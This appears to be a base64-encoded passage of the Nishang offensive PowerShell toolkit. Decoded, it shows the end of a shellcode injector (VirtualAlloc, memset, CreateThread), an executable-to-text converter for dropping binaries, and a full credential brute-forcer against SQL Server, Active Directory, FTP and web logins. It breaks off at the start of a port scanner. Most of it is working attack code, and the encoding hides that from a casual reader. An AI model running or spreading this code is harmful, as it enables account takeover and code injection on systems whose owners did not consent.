Z3RofSAKICAgICR4PSR3aW5GdW5jOjpWaXJ0dWFsQWxsb2MoMCwweDEwMDAsJHNpemUsMHg0MCkgCiAgICBmb3IgKCRpPTA7JGkgLWxlICgkc2MuTGVuZ3RoLTEpOyRpKyspIHskd2luRnVuYzo6bWVtc2V0KFtJbnRQdHJdKCR4LlRvSW50MzIoKSskaSksICRzY1skaV0sIDEpfSAKICAgICR3aW5GdW5jOjpDcmVhdGVUaHJlYWQoMCwwLCR4LDAsMCwwKSAKICAgIHdoaWxlKCRUcnVlKQogICAgewogICAgICAgIHN0YXJ0LXNsZWVwIC1TZWNvbmRzIDEwMAogICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNjb252ZXJ0IGFuIGV4ZWN1dGFibGUgdG8gdGV4dCBmaWxlLiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZnVuY3Rpb24gRXhldG9UZXh0CnsKPCMKLlNZTk9QU0lTCk5pc2hhbmcgc2NyaXB0IHRvIGNvbnZlcnQgYW4gZXhlY3V0YWJsZSB0byB0ZXh0IGZpbGUuCgouREVTQ1JJUFRJT04KVGhpcyBzY3JpcHQgY29udmVydHMgYW5kIGFuIGV4ZWN1dGFibGUgdG8gYSB0ZXh0IGZpbGUuCgouUEFSQU1FVEVSIEVYRQpUaGUgcGF0aCBvZiB0aGUgZXhlY3V0YWJsZSB0byBiZSBjb252ZXJ0ZWQuCgouUEFSQU1FVEVSIEZpbGVOYW1lClBhdGggb2YgdGhlIHRleHQgZmlsZSB0byB3aGljaCBleGVjdXRhYmxlIHdpbGwgYmUgY29udmVydGVkLgoKLkVYQU1QTEUKUFMgPiBFeGV0b1RleHQgQzpcYmluYXJpZXNcZXZpbC5leGUgQzpcdGVzdFxldmlsLnR4dAoKLkxJTksKaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vMjAxMS8wOS9kcm9wcGluZy1leGVjdXRhYmxlcy13aXRoLXBvd2Vyc2hlbGwuaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRFWEUsIAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRmlsZW5hbWUKICAgICkKICAgIFtieXRlW11dICRoZXhkdW1wID0gZ2V0LWNvbnRlbnQgLWVuY29kaW5nIGJ5dGUgLXBhdGggIiRFWEUiCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbExpbmVzKCRGaWxlbmFtZSwgKFtzdHJpbmddJGhleGR1bXApKQogICAgV3JpdGUtT3V0cHV0ICJDb252ZXJ0ZWQgZmlsZSB3cml0dGVuIHRvICRGaWxlbmFtZSIKfQoKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1BlcmZvcm1zIGEgQnJ1dGUtRm9yY2UgQXR0YWNrIGFnYWluc3QgU1FMIFNlcnZlciwgQWN0aXZlIERpcmVjdG9yeSwgV2ViIGFuZCBGVFAuIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMjIyNUaGFua3MgTmlrbGFzIEdvdWRlIyMjIyMKIyMjaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wMy91c2UtcG93ZXJzaGVsbC10by1zZWN1cml0eS10ZXN0LXNxbC1zZXJ2ZXItYW5kLXNoYXJlcG9pbnQuYXNweAoKZnVuY3Rpb24gSW52b2tlLUJydXRlRm9yY2UgCnsKICA8IwouU1lOT1BTSVMKTmlzaGFuZyBwYXlsb2FkIHdoaWNoIHBlcmZvcm1zIGEgQnJ1dGUtRm9yY2UgQXR0YWNrIGFnYWluc3QgU1FMIFNlcnZlciwgQWN0aXZlIERpcmVjdG9yeSwgV2ViIGFuZCBGVFAuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGNhbiBicnV0ZSBmb3JjZSBjcmVkZW50aWFscyBmb3IgU1FMIFNlcnZlciwgQWN0aXZlRGlyZWN0b3J5LCBXZWIgb3IgRlRQLgoKLlBBUkFNRVRFUiBDb21wdXRlcm5hbWUKU3BlY2lmaWVzIGEgU1FMIFNlcnZlciwgRG9tYWluLCBGVFAgU2l0ZSBvciBXZWIgU2l0ZS4KCi5QQVJBTUVURVIgVXNlckxpc3QKU3BlY2lmeSBhIGxpc3Qgb2YgdXNlcnMuIElmIGJsYW5rLCB0cnVzdGVkIGNvbm5lY3Rpb24gd2lsbCBiZSB1c2VkIGZvciBTUUwgYW5kIGFuIGVycm9yIHdpbGwgYmUgZ2VucmF0ZWQgZm9yIG90aGVyIHNlcnZpY2VzLgoKLlBBUkFNRVRFUiBQYXNzd29yZExpc3QKU3BlY2lmeSBhIGxpc3Qgb2YgcGFzc3dvcmRzLgoKLlBBUkFNRVRFUiBTZXJ2aWNlCkVudGVyIGEgU2VydmljZSBmcm9tIFNRTCwgQWN0aXZlRGlyZWNvdHJ5LCBGVFAgYW5kIFdlYi4gRGVmYXVsdCBzZXJ2aWNlIGlzIHNldCB0byBTUUwuCgouUEFSQU1FVEVSIFN0b3BPblN1Y2Nlc3MKVXNlIHRoaXMgc3dpdGNoIHRvIHN0b3AgdGhlIGJydXRlIGZvcmNpbmcgb24gdGhlIGZpcnN0IHN1Y2Nlc3MuCgouRVhBTVBMRQpQUyA+IEludm9rZS1CcnV0ZUZvcmNlIC1Db21wdXRlck5hbWUgU1FMU2VydjAxIC1Vc2VyTGlzdCBDOlx0ZXN0XHVzZXJzLnR4dCAtUGFzc3dvcmRMaXN0IEM6XHRlc3Rcd29yZGxpc3QudHh0IC1TZXJ2aWNlIFNRTCAtVmVyYm9zZQpCcnV0ZSBmb3JjZSBhIFNRTCBTZXJ2ZXIgU1FMU2VydjAxIGZvciB1c2VycyBsaXN0ZWQgaW4gdXNlcnMudHh0IGFuZCBwYXNzd29yZHMgaW4gd29yZGxpc3QudHh0CgouRVhBTVBMRQpQUyA+IEludm9rZS1CcnV0ZUZvcmNlIC1Db21wdXRlck5hbWUgdGFyZ2V0ZG9tYWluLmNvbSAtVXNlckxpc3QgQzpcdGVzdFx1c2Vycy50eHQgLVBhc3N3b3JkTGlzdCBDOlx0ZXN0XHdvcmRsaXN0LnR4dCAtU2VydmljZSBBY3RpdmVEaXJlY3RvcnkgLVN0b3BPblN1Y2Nlc3MgLVZlcmJvc2UKQnJ1dGUgZm9yY2UgYSBEb21haW4gQ29udHJvbGxlciBvZiB0YXJnZXRkb21haW4uY29tIGZvciB1c2VycyBsaXN0ZWQgaW4gdXNlcnMudHh0IGFuZCBwYXNzd29yZHMgaW4gd29yZGxpc3QudHh0LgpTaW5jZSBTdG9wT25TdWNjZXNzIGlzIHNwZWNpZmllZCwgdGhlIGJydXRlIGZvcmNpbmcgc3RvcHMgb24gZmlyc3Qgc3VjY2Vzcy4KCi5FWEFNUExFClBTID4gY2F0IEM6XHRlc3Rcc2VydmVycy50eHQgfCBJbnZva2UtQnJ1dGVGb3JjZSAtVXNlckxpc3QgQzpcdGVzdFx1c2Vycy50eHQgLVBhc3N3b3JkTGlzdCBDOlx0ZXN0XHdvcmRsaXN0LnR4dCAtU2VydmljZSBTUUwgLVZlcmJvc2UKQnJ1dGUgZm9yY2UgU1FMIFNlcnZpY2Ugb24gYWxsIHRoZSBzZXJ2ZXJzIHNwZWNpZmllZCBpbiBzZXJ2ZXJzLnR4dAoKLkxJTksKaHR0cDovL3d3dy50cnVlc2VjLmNvbQpodHRwOi8vYmxvZ3MudGVjaG5ldC5jb20vYi9oZXlzY3JpcHRpbmdndXkvYXJjaGl2ZS8yMDEyLzA3LzAzL3VzZS1wb3dlcnNoZWxsLXRvLXNlY3VyaXR5LXRlc3Qtc3FsLXNlcnZlci1hbmQtc2hhcmVwb2ludC5hc3B4Cmh0dHBzOi8vZ2l0aHViLmNvbS9zYW1yYXRhc2hvay9uaXNoYW5nCgouTk9URVMKR291ZGUgMjAxMiwgVHJldVNlYwojPgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSwgUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZT0kdHJ1ZSldCiAgICAgICAgW0FsaWFzKCJQU0NvbXB1dGVyTmFtZSIsIkNOIiwiTWFjaGluZU5hbWUiLCJJUCIsIklQQWRkcmVzcyIsIklkZW50aXR5IiwiVXJsIiwiRnRwIiwiRG9tYWluIiwiRGlzdGluZ3Vpc2hlZE5hbWUiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJMaXN0LAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXNzd29yZExpc3QsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkZmFsc2UpXSBbVmFsaWRhdGVTZXQoIlNRTCIsIkZUUCIsIkFjdGl2ZURpcmVjdG9yeSIsIldlYiIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZpY2UgPSAiU1FMIiwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU3RvcE9uU3VjY2VzcwogICAgKQoKICAgIFByb2Nlc3MgCiAgICB7CiAgICAgICAgJHVzZXJuYW1lcyA9IEdldC1Db250ZW50ICRVc2VyTGlzdAogICAgICAgICRwYXNzd29yZHMgPSBHZXQtQ29udGVudCAkUGFzc3dvcmRMaXN0CiAgICAgICAgI0JydXRlIGZvcmNlIFNRTCBTZXJ2ZXIKICAgICAgICAkQ29ubmVjdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRhdGEuU1FMQ2xpZW50LlNRTENvbm5lY3Rpb24KICAgICAgICBmdW5jdGlvbiBDaGVja0ZvclNRTFN1Y2Nlc3MKICAgICAgICB7CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQ29ubmVjdGlvbi5PcGVuKCkKICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRzdWNjZXNzIC1lcSAkdHJ1ZSkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiTWF0Y2ggZm91bmQhICR1c2VybmFtZSA6ICRQYXNzd29yZCIKICAgICAgICAgICAgICAgIHN3aXRjaCAoJGNvbm5lY3Rpb24uU2VydmVyVmVyc2lvbikgewogICAgICAgICAgICAgICAgICAgIHsgJF8gLW1hdGNoICJeNiIgfSB7ICJTUUwgU2VydmVyIDYuNSI7QnJlYWsgVXNlcm5hbWVMb29wIH0KICAgICAgICAgICAgICAgICAgICB7ICRfIC1tYXRjaCAiXjYiIH0geyAiU1FMIFNlcnZlciA3IjtCcmVhayBVc2VybmFtZUxvb3AgfQogICAgICAgICAgICAgICAgICAgIHsgJF8gLW1hdGNoICJeOCIgfSB7ICJTUUwgU2VydmVyIDIwMDAiO0JyZWFrIFVzZXJuYW1lTG9vcCB9CiAgICAgICAgICAgICAgICAgICAgeyAkXyAtbWF0Y2ggIl45IiB9IHsgIlNRTCBTZXJ2ZXIgMjAwNSI7QnJlYWsgVXNlcm5hbWVMb29wIH0KICAgICAgICAgICAgICAgICAgICB7ICRfIC1tYXRjaCAiXjEwXC4wMCIgfSB7ICJTUUwgU2VydmVyIDIwMDgiO0JyZWFrIFVzZXJuYW1lTG9vcCB9CiAgICAgICAgICAgICAgICAgICAgeyAkXyAtbWF0Y2ggIl4xMFwuNTAiIH0geyAiU1FMIFNlcnZlciAyMDA4IFIyIjtCcmVhayBVc2VybmFtZUxvb3AgfQogICAgICAgICAgICAgICAgICAgIHsgJF8gLW1hdGNoICJeMTEiIH0geyAiU1FMIFNlcnZlciAyMDEyIjtCcmVhayBVc2VybmFtZUxvb3AgfQogICAgICAgICAgICAgICAgICAgIHsgJF8gLW1hdGNoICJeMTIiIH0geyAiU1FMIFNlcnZlciAyMDE0IjtCcmVhayBVc2VybmFtZUxvb3AgfQogICAgICAgICAgICAgICAgICAgIERlZmF1bHQgeyAiVW5rbm93biIgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IAogICAgICAgIH0KICAgICAgICBpZigkc2VydmljZSAtZXEgIlNRTCIpIAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJCcnV0ZSBGb3JjaW5nIFNRTCBTZXJ2aWNlIG9uICRDb21wdXRlck5hbWUiCiAgICAgICAgICAgIGlmKCR1c2VyTGlzdCkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIDpVc2VybmFtZUxvb3AgZm9yZWFjaCAoJHVzZXJuYW1lIGluICR1c2VybmFtZXMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJFBhc3N3b3JkIGluICRQYXNzd29yZHMpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkQ29ubmVjdGlvbi5Db25uZWN0aW9uU3RyaW5nID0gIkRhdGEgU291cmNlPSRDb21wdXRlck5hbWU7SW5pdGlhbCBDYXRhbG9nPU1hc3RlcjtVc2VyIElkPSR1c2VyTmFtZTtQYXNzd29yZD0kcGFzc3dvcmQ7IgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDaGVja2luZyAkdXNlck5hbWUgOiAkcGFzc3dvcmQiCiAgICAgICAgICAgICAgICAgICAgICAgIENoZWNrRm9yU1FMU3VjY2VzcwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSAKICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgI0lmIG5vIHVzZXJuYW1lIGlzIHByb3ZpZGVkLCB1c2UgdHJ1c3RlZCBjb25uZWN0aW9uCiAgICAgICAgICAgICAgICAkQ29ubmVjdGlvbi5Db25uZWN0aW9uU3RyaW5nID0gInNlcnZlcj0kaWRlbnRpdHk7SW5pdGlhbCBDYXRhbG9nPU1hc3Rlcjt0cnVzdGVkX2Nvbm5lY3Rpb249dHJ1ZTsiCiAgICAgICAgICAgICAgICBDaGVja0ZvclNRTFN1Y2Nlc3MKCiAgICAgICAgICAgIH0KICAgICAgICB9IAoKICAgICAgICAjQnJ1dGUgRm9yY2UgRlRQCiAgICAgICAgZWxzZWlmICgkc2VydmljZSAtZXEgIkZUUCIpCiAgICAgICAgewogICAgICAgICAgICBpZigkQ29tcHV0ZXJOYW1lIC1ub3RNYXRjaCAiXmZ0cDovLyIpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc291cmNlID0gImZ0cDovLyIgKyAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHNvdXJjZSA9ICRDb21wdXRlck5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkJydXRlIEZvcmNpbmcgRlRQIG9uICRDb21wdXRlck5hbWUiCgogICAgICAgICAgICA6VXNlcm5hbWVMb29wIGZvcmVhY2ggKCR1c2VybmFtZSBpbiAkdXNlcm5hbWVzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkUGFzc3dvcmQgaW4gJFBhc3N3b3JkcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICB0cnkgCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkZnRwUmVxdWVzdCA9IFtTeXN0ZW0uTmV0LkZ0cFdlYlJlcXVlc3RdOjpDcmVhdGUoJHNvdXJjZSkKICAgICAgICAgICAgICAgICAgICAgICAgJGZ0cFJlcXVlc3QuTWV0aG9kID0gW1N5c3RlbS5OZXQuV2ViUmVxdWVzdE1ldGhvZHMrRnRwXTo6TGlzdERpcmVjdG9yeURldGFpbHMKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2hlY2tpbmcgJHVzZXJOYW1lIDogJHBhc3N3b3JkIgogICAgICAgICAgICAgICAgICAgICAgICAkZnRwUmVxdWVzdC5DcmVkZW50aWFscyA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbCgkdXNlck5hbWUsICRwYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRmdHBSZXF1ZXN0LkdldFJlc3BvbnNlKCkKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSAkcmVzdWx0LkJhbm5lck1lc3NhZ2UgKyAkcmVzdWx0LldlbGNvbWVNZXNzYWdlCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiTWF0Y2ggZm91bmQhICR1c2VybmFtZSA6ICRQYXNzd29yZCIKICAgICAgICAgICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFN0b3BPblN1Y2Nlc3MpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIFVzZXJuYW1lTG9vcAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBjYXRjaCAKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJGVycm9yWzBdLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfQoKICAgICAgICAjQnJ1dGUgRm9yY2UgQWN0aXZlIERpcmVjdG9yeQogICAgICAgIGVsc2VpZiAoJHNlcnZpY2UgLWVxICJBY3RpdmVEaXJlY3RvcnkiKSAKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiQnJ1dGUgRm9yY2luZyBBY3RpdmUgRGlyZWN0b3J5ICRDb21wdXRlck5hbWUiCiAgICAgICAgICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50CiAgICAgICAgICAgICRjb250ZXh0VHlwZSA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuQ29udGV4dFR5cGVdOjpEb21haW4KICAgICAgICAgICAgVHJ5IAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcHJpbmNpcGFsQ29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQoJGNvbnRleHRUeXBlLCAkQ29tcHV0ZXJOYW1lKQogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkdHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICJVbmFibGUgdG8gY29udGFjdCBEb21haW4iCiAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRzdWNjZXNzIC1uZSAkZmFsc2UpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICA6VXNlcm5hbWVMb29wIGZvcmVhY2ggKCR1c2VybmFtZSBpbiAkdXNlcm5hbWVzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRQYXNzd29yZCBpbiAkUGFzc3dvcmRzKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgVHJ5IAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDaGVja2luZyAkdXNlck5hbWUgOiAkcGFzc3dvcmQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICRwcmluY2lwYWxDb250ZXh0LlZhbGlkYXRlQ3JlZGVudGlhbHMoJHVzZXJuYW1lLCAkcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICJQYXNzd29yZCBNYXRjaCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkc3VjY2VzcyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJNYXRjaCBmb3VuZCEgJHVzZXJuYW1lIDogJFBhc3N3b3JkIiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkU3RvcE9uU3VjY2VzcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIFVzZXJuYW1lTG9vcAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBDYXRjaCAKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gIlBhc3N3b3JkIGRvZXNuJ3QgbWF0Y2giCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgI0JydXRlIEZvcmNlIFdlYgogICAgICAgIGVsc2VpZiAoJHNlcnZpY2UgLWVxICJXZWIiKSAKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkQ29tcHV0ZXJOYW1lIC1ub3RNYXRjaCAiXihodHRwfGh0dHBzKTovLyIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRzb3VyY2UgPSAiaHR0cDovLyIgKyAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgIH0gCiAgICAgICAgICAgIGVsc2UgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRzb3VyY2UgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgOlVzZXJuYW1lTG9vcCBmb3JlYWNoICgkdXNlcm5hbWUgaW4gJHVzZXJuYW1lcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgZm9yZWFjaCAoJFBhc3N3b3JkIGluICRQYXNzd29yZHMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHdlYkNsaWVudCA9IE5ldy1PYmplY3QgTmV0LldlYkNsaWVudAogICAgICAgICAgICAgICAgICAgICRzZWN1cmVQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgLUFzUGxhaW5UZXh0IC1TdHJpbmcgJHBhc3N3b3JkIC1Gb3JjZQogICAgICAgICAgICAgICAgICAgICRjcmVkZW50aWFsID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwgLUFyZ3VtZW50TGlzdCAkdXNlck5hbWUsICRzZWN1cmVQYXNzd29yZAogICAgICAgICAgICAgICAgICAgICR3ZWJDbGllbnQuQ3JlZGVudGlhbHMgPSAkY3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgIFRyeSAKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNoZWNraW5nICR1c2VyTmFtZSA6ICRwYXNzd29yZCIKICAgICAgICAgICAgICAgICAgICAgICAgJHNvdXJjZQogICAgICAgICAgICAgICAgICAgICAgICAkd2ViQ2xpZW50LkRvd25sb2FkU3RyaW5nKCRzb3VyY2UpCiAgICAgICAgICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgJHN1Y2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzdWNjZXNzIC1lcSAkdHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJNYXRjaCBmb3VuZCEgJFVzZXJuYW1lIDogJFBhc3N3b3JkIiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRTdG9wT25TdWNjZXNzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIFVzZXJuYW1lTG9vcAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIENhdGNoIAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSAiUGFzc3dvcmQgZG9lc24ndCBtYXRjaCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNTY2FuIElQLUFkZHJlc3NlcywgUG9ydHMgYW5kIEhvc3ROYW1lcyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyMjVGhhbmtzIE5pa2xhcyBHb3VkZSMjIyMjCmZ1bmN0aW9uIFBvcnQtU2NhbiB7Cgo8IwouU1lOT1BTSVMKTmloc2FuZyBwYXlsb2FkIHdoaWNoIFNjYW4gSVAtQWRkcmVzc2VzLCBQb3J0cyBhbmQgSG9zdE5hbWVzCgouREVTQ1JJUFRJT04KU2NhbiBmb3IgSVAtQWRkcmVzc2VzLCBIb3N0TmFtZXMgYW5kIG9wZW4gUG9ydHMgaW4geW91ciBOZXR3b3JrLgogICAgCi5QQVJBTUVURVIgU3RhcnRBZGRyZXNzClN0YXJ0QWRkcmVzcyBSYW5nZQoKLlBBUkFNRVRFUiBFbmRBZGRyZXNzCkVuZEFkZHJlc3MgUmFuZ2UKCi5QQVJBTUVURVIgUmVzb2x2ZUhvc3QKUmVzb2x2ZSBIb3N0TmFtZQoKLlBBUkFNRVRFUiBTY2FuUG9ydApQZXJmb3JtIGEgUG9ydFNjYW4KCi5QQVJBTUVURVIgUG9ydHMKUG9ydHMgVGhhdCBzaG91bGQgYmUgc2Nhbm5lZCwgZGVmYXVsdCB2YWx1ZXMgYXJlOiAyMSwyMiwyMyw1Myw2OSw3MSw4MCw5OCwxMTAsMTM5LDExMSwKMzg5LDQ0Myw0NDUsMTA4MCwxNDMzLDIwMDEsMjA0OSwzMDAxLDMxMjgsNTIyMiw2NjY3LDY4NjgsNzc3Nyw3ODc4LDgwODAsMTUyMSwzMzA2LDMzODksCjU4MDEsNTkwMCw1NTU1LDU5MDEKCi5QQVJBTUVURVIgVGltZU91dApUaW1lIChpbiBNaWxsaVNlY29uZHMpIGJlZm9yZSBUaW1lT3V0LCBEZWZhdWx0IHNldCB0byAxMDAKCi5FWEFNUExFClBvcnQtU2NhbiAtU3RhcnRBZGRyZXNzIDE5Mi4xNjguMC4xIC1FbmRBZGRyZXNzIDE5Mi4xNjguMC4yNTQKCi5FWEFNUExFClBvcnQtU2NhbiAtU3RhcnRBZGRyZXNzIDE5Mi4xNjguMC4xIC1FbmRBZGRyZXNzIDE5Mi4xNjguMC4yNTQg